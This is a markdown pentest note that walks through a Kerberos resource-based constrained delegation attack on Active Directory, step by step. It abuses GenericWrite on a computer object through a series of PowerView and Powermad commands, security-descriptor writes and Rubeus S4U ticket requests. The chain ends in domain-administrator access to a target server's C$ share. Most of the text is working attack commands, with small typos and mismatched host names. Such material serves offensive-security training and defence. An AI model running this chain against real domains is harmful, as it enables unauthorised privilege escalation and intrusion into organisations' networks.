# Kerberos - Resource-Based Constrained Delegation (GenericWrite & PowerMad)

## Informations

Constrained delegation works by configuring SPNs on the frontend service under the msDS-AllowedToDelegateTo property.
Configuring constrained delegation also requires the SeEnableDelegationPrivilege privilege on the domain controller, which is typically only enabled for Domain Admins.

With the release of Windows Server 2012, Microsoft introduced resource-based constrained delegation (RBCD), which is meant to remove the requirement of highly elevated access rights like SeEnableDelegationPrivilege from system administrators.
RBCD attack leads to code execution.

This specific vector starts by compromising a domain account that has the GenericWrite access right on a computer account object.
This technique is the only known way of turning GenericWrite on a computer object into code execution.

## Enumeration

1. Enumerate domain computer with powerview :

```PowerShell
PS C:\tools> Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

By default, any authenticated user can add up to ten computer accounts to the domain and they will have SPNs set automatically.
This value is present in the ms-DS-MachineAccountQuota property in the Active Directory domain object.

2. We can enumerate it with powerview.

```PowerShell
Get-DomainObject -Identity dev -Properties ms-DS-MachineAccountQuota
```

Normally, the computer account object is created when a physical computer is joined to the domain.

3. We can simply create the object itself with Powermad powershell script.

```PowerShell
PS C:\tools> . .\powermad.ps1
PS C:\tools> New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
PS C:\tools> Get-DomainComputer -Identity myComputer
```

The msDS-AllowdToActOnBehalfOfOtherIdentity property stores the SID as part of a security descriptor in a binary format.
We must convert the SID of our newly-created computer object to the correct format in order to proceed with the attack.

To do this, we must first create a new security descriptor with the correct SID.

4. We can use the RawSecurityDescriptor class to instantiate a SecurityDescriptor Object.

```PowerShell
PS C:\> $sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
PS C:\> $SD = New-Object Security.AccessControl.RawSecurityDescriptor - ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
```

5. With the SecurityDescriptor object created, we must convert it into a byte array to match the format for the msDS-AllowedToActOnBehalfOfOtherIdentity property.

```PowerShell
PS C:\> $SDbytes = New-Object byte[] ($SD.BinaryLength)
PS C:\> $SD.GetBinaryForm($SDbytes,0)
```

6. Now we can obtain a handle to the computer object and then update properties.

```PowerShell
PS C:\> Get-DomainComputer -Identity devsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

After writing the SecurityDescriptor to the property field, we should verify it.

7. We can do this by reading the binary version of it, then instantiating a SecurityDescriptor object with RawSecurityDescriptor and finally displaying the DACL.

```PowerShell
PS C:\> $RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
PS C:\> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor - ArgumentList $RBCDbytes, 0
PS C:\> $Descriptor.DiscretionaryAcl

PS C:\> ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-2101
```

Now we are ready to launch our attack.

## Launch the Attack

1. Obtaining the hash of the computer account password with Rubeus.

```PowerShell
.\Rubeus.exe hash /password:h4x
```

2. Request a TGT ticket.

```PowerShell
.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt
```

3. Check the success of this attack, dump any loaded keberos tickets

```bash
klsit
```

4. Interact wiht file services on appsrv01 in the context of the administrator domain admin user.

```PowerShell
dir \\appsrv01.prod.corp1.com\c$
```

Our access to appsrv01 is in the context of the administrator domain admin user. 

We can use our CIFS access to obtain code execution on appsrv01, but in the process we will perform a network login instead of an interactive login. 

This means our access will be limited to appsrv01 and cannot directly be used to expand access towards the rest of the domain.